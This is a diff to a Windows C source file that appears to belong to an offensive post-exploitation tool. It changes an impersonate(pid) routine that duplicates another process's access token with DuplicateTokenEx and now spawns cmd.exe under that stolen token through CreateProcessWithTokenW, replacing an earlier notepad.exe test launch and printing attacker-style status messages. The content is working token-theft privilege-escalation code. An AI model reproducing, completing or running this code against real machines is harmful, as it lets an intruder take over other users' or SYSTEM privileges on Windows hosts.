@@ -16,8 +16,7 @@
 #include <tlhelp32.h>
 #include <tchar.h>
 #include <aclapi.h>
-
-#define ERROR_NOT_ALL_ASSIGNED 1300L
+#include <winbase.h>
 
 char* getTokenPrivilegesAsString(HANDLE hToken) {
     DWORD dwSize = 0;
@@ -327,7 +326,6 @@ char *impersonate(int pid){
     char *impersonation = "[+] Impersonation successfull.\r\n";
     HANDLE hUserToken;
     enableAssignPrimaryTokenPrivilege();
-    enableIncreaseQuotaPrivilege();
     if (hToken) {
         open = "[+] Obtained duplicated token.\r\n";
         
@@ -336,32 +334,26 @@ char *impersonate(int pid){
             impersonation = "[-] Impersonation unsuccessfull.\r\n";
             CloseHandle(hToken);
         }
-
-        if (DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken)) {
-            // Prepare the PowerShell command
-     
-            BOOL bRet = CreateProcessAsUser(hToken,
-                                            "c:\\windows\\system32\\notepad.exe",
-                                            NULL,
-                                            NULL,
-                                            NULL,
-                                            TRUE,
-                                            CREATE_NEW_CONSOLE,
-                                            NULL,
-                                            NULL,
-                                            &si,
-                                            &pi);
-            if (bRet){
-                printf("Good"); 
-            } else {
-                printf("DuplicateTokenEx failed (%d).\n", GetLastError());
-            }
-            CloseHandle(hUserToken);
-        } else {
-            printf("DuplicateTokenEx failed (%d).\n", GetLastError());
+        newUser = getName();
+        // Call DuplicateTokenEx(), print return code and error code
+        BOOL duplicateToken = DuplicateTokenEx(hToken, MAXIMUM_ALLOWED, NULL, SecurityImpersonation, TokenPrimary, &hUserToken);
+        if (duplicateToken){
+            printf("[+] DuplicateTokenEx() success!\n");
+        }
+        else{
+            printf("[-] DuplicateTokenEx() Return Code: %i\n", duplicateToken);
+            printf("[-] DuplicateTokenEx() Error: %i\n", GetLastError());
         }
 
-        newUser = getName();
+        // Call CreateProcessWithTokenW(), print return code and error code
+        BOOL createProcess = CreateProcessWithTokenW(hToken, LOGON_WITH_PROFILE, L"C:\\Windows\\System32\\cmd.exe", NULL, 0, NULL, NULL, &si, &pi);
+        if (createProcess){
+            printf("[+] Process spawned!\n");
+        }else{
+            printf("[-] CreateProcessWithTokenW Return Code: %i\n", createProcess);
+            printf("[-] CreateProcessWithTokenW Error: %i\n", GetLastError());
+        }
+
         RevertToSelf();
         CloseHandle(hToken);
     }
